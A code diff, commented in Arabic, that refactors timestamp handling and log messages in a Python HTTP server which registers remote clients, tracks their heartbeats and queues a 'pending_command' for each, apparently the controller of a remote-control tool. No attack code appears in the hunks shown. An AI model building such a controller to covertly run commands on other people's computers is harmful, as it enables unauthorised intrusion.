@@ -1515,9 +1515,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             incoming_computer = data.get('computer', 'Unknown')
             incoming_os = data.get('os', 'Unknown')
             
-            # ⚡ الوقت الحالي بنفس التنسيق
-            current_time = datetime.now()
-            current_time_iso = current_time.isoformat()
+            # ⚡ التعديل: استخدام متغير واحد للوقت
+            current_time = datetime.now().isoformat()
     
             if incoming_user == 'Unknown' and '-' in client_id:
                 try:
@@ -1527,7 +1526,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         incoming_computer = parts[0]
                 except:
                     pass
-                    
+                
             existing_client = None
             for cid, client_data in self.sessions.items():
                 current_user = client_data.get('user', '')
@@ -1539,23 +1538,23 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     incoming_computer != 'Unknown'):
                     existing_client = cid
                     break
-                    
+                
             if existing_client is None and client_id in self.sessions:
                 existing_client = client_id
     
             if existing_client:
-                # ⚡ التحديث المباشر - نفس طريقة التسجيل الأول
-                self.sessions[existing_client]['last_seen'] = current_time_iso
+                # ⚡ التعديل: استخدام المتغير الموحد
+                self.sessions[existing_client]['last_seen'] = current_time
                 self.sessions[existing_client]['status'] = 'online'
                 self.sessions[existing_client]['ip'] = client_ip
     
                 if incoming_os != 'Unknown':
                     self.sessions[existing_client]['os'] = incoming_os
     
-                print(f"🟢 HEARTBEAT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f" INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
             else:
-                # ⚡ التسجيل الجديد - نفس الطريقة
+                # ⚡ التعديل: استخدام المتغير الموحد
                 self.sessions[client_id] = {
                     'id': client_id,
                     'ip': client_ip,
@@ -1563,13 +1562,13 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     'computer': incoming_computer,
                     'os': incoming_os,
                     'user': incoming_user,
-                    'first_seen': current_time_iso,
-                    'last_seen': current_time_iso,
+                    'first_seen': current_time,  # ⚡ نفس التنسيق
+                    'last_seen': current_time,   # ⚡ نفس التنسيق
                     'pending_command': None,
                     'last_response': None,
                     'status': 'online'
                 }
-                print(f"🟢 NEW CLIENT Registered: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f" INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': client_id, 'instant': True})
                 
     def send_sessions_list(self):
@@ -1595,10 +1594,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         client_data['is_online'] = time_diff < 30  # 30 seconds for online
                         client_data['last_seen_seconds'] = time_diff
                         active_clients.append(client_data)
-                        
-                        # ⚡ طباعة حالة العميل
-                        status = "🟢 ONLINE" if is_online else "🔴 OFFLINE"
-                        print(f"📊 Client {client_id}: {status} ({time_diff:.1f}s ago)")
                     else:
                         del self.sessions[client_id]
                         print(f"INSTANT Removed inactive: {client_id}")
